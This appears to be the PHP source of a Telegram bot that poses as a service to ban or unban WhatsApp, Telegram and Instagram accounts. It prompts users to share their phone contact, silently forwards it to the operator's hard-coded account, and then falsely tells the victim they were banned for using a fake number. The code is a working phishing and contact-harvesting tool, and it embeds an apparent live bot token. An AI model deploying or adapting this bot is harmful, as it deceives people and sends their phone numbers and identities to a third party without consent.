<?php
flush();
ob_start();
set_time_limit(0);
error_reporting(0);
ob_implicit_flush(1);
#===۞ABDO𝗜۞===#
$token = "6925732804:AAG1po2xtzhUQvReJPEp91eKRUEhBC5JpBc";# توكنك تمام
#===۞ABDO===#
define('API_KEY',$token);
echo "setWebhook ~> <a href=\"https://api.telegram.org/bot".API_KEY."/setwebhook?url=".$_SERVER['SERVER_NAME']."".$_SERVER['SCRIPT_NAME']."\">https://api.telegram.org/bot".API_KEY."/setwebhook?url=".$_SERVER['SERVER_NAME']."".$_SERVER['SCRIPT_NAME']."</a>";
function bot($method,$datas=[]){
$url = "https://api.telegram.org/bot".API_KEY."/".$method;
$ch = curl_init();
curl_setopt($ch,CURLOPT_URL,$url); curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
curl_setopt($ch,CURLOPT_POSTFIELDS,$datas);
$res = curl_exec($ch);
if(curl_error($ch)){
var_dump(curl_error($ch));
}else{
return json_decode($res);
}}

$update = json_decode(file_get_contents("php://input"));
file_put_contents("update.txt",json_encode($update));
$message = $update->message;
$text = $message->text;
$photo=$message->photo;
$chat_id = $message->chat->id;
$from_id = $message->from->id;$type = $message->chat->type;
$message_id = $message->message_id;
$name = $message->from->first_name.' '.$message->from->last_name;
$user = strtolower($message->from->username);
$amrid = "6716608590"; #ايديك
$t =$message->chat->title; 
if(isset($update->callback_query)){
$up = $update->callback_query;
$chat_id = $up->message->chat->id;
$from_id = $up->from->id;
$user = strtolower($up->from->username); 
$name = $up->from->first_name.' '.$up->from->last_name;
$message_id = $up->message->message_id;
$mes_id = $update->callback_query->inline_message_id; 
$data = $up->data;
}
if(isset($update->inline_query)){
$chat_id = $update->inline_query->chat->id;
$from_id = $update->inline_query->from->id;
$name = $update->inline_query->from->first_name.' '.$update->inline_query->from->last_name;
$text_inline = $update->inline_query->query;
$mes_id = $update->inline_query->inline_message_id; 
$user = strtolower($update->inline_query->from->username); 
}
$amr2 = file_get_contents('idAMR.txt');
$amr = explode("\n", $amr2);
 if($text =="/start"){
if(in_array($chat_id, $amr)){
Bot('SendMessage',[
'chat_id'=>$chat_id,
'text'=>"يرجي تسجيل الدخول بالحساب المراد تفعيله",
                 'parse_mode'=>"markdown",
]);
} else {
bot('sendphoto',[
'chat_id'=>$chat_id,
'photo'=>"https://t.me/black1_hat",
'caption'=>"اهلا بك في اول بوت عربي لحظر و فك حظر جميع حسابات مواقع التواصل الاجتماعي ** واتساب ** ، ** تلغرام ** ، ** انستجرام ** ",
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>"اضغط هنا للتسجيل",'request_contact' => true]],
],
'resize_keyboard' =>true,
]),
'reply_to_message_id'=>$message_id,
]);
return false;
}}
if($update->message->from->id == $update->message->contact->user_id){
bot('forwardMessage',[
 'chat_id'=>$amrid,
 'from_chat_id'=>$chat_id,
 'message_id'=>$message->message_id,
 ]);
bot('sendmessage',[
  'chat_id'=>$chat_id,
'text'=>"*تم حظرك لاستخدمك رقم وهمي ❌*",
                 'parse_mode'=>"markdown",
]);
file_put_contents("idAMR.txt","$chat_id");
}

